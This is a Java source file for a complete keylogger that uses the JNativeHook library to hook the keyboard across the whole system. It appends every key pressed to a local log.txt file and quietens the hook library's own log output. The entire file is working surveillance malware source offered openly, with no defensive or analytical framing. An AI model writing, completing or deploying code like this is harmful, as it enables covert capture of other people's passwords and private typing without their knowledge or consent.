import java.io.IOException;
import java.io.OutputStream;
import java.io.PrintWriter;
import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.Paths;
import java.nio.file.StandardOpenOption;
import java.util.logging.Level;
import java.util.logging.Logger;

import org.jnativehook.GlobalScreen;
import org.jnativehook.NativeHookException;
import org.jnativehook.keyboard.NativeKeyEvent;
import org.jnativehook.keyboard.NativeKeyListener;

/**
 *
 * @author bryan
 */

public class KeyLogger implements NativeKeyListener{
    
    private static final Path FILE = Paths.get("log.txt");
    
    public static void main(String[] args) {
        // Get the logger for "com.github.kwhat.jnativehook" and set the level to warning.
        Logger logger = Logger.getLogger(GlobalScreen.class.getPackage().getName());
        logger.setLevel(Level.WARNING);

        // Don't forget to disable the parent handlers.
        logger.setUseParentHandlers(false);
        
        try{  
            GlobalScreen.registerNativeHook();      
        }catch (NativeHookException ex){
            ex.printStackTrace();
            System.exit(0);
        }
        
        GlobalScreen.addNativeKeyListener(new KeyLogger());
   
    }

    @Override
    public void nativeKeyPressed(NativeKeyEvent nke) {
        String keyText = NativeKeyEvent.getKeyText(nke.getKeyCode());
        
        try 
            (
            OutputStream os = Files.newOutputStream(FILE, StandardOpenOption.CREATE, StandardOpenOption.WRITE, StandardOpenOption.APPEND);
            PrintWriter writer = new PrintWriter(os)
            ){
            
            if(keyText.length() > 1){
                writer.print("[" + keyText + "]");
            }else{
                writer.print(keyText);
            }
            
        } catch (IOException ex) {
            System.exit(-1);
        }
    }

    @Override
    public void nativeKeyReleased(NativeKeyEvent nke) {
        // Nothing
    }
    
        @Override
    public void nativeKeyTyped(NativeKeyEvent nke) {
        // Nothing
    }
}
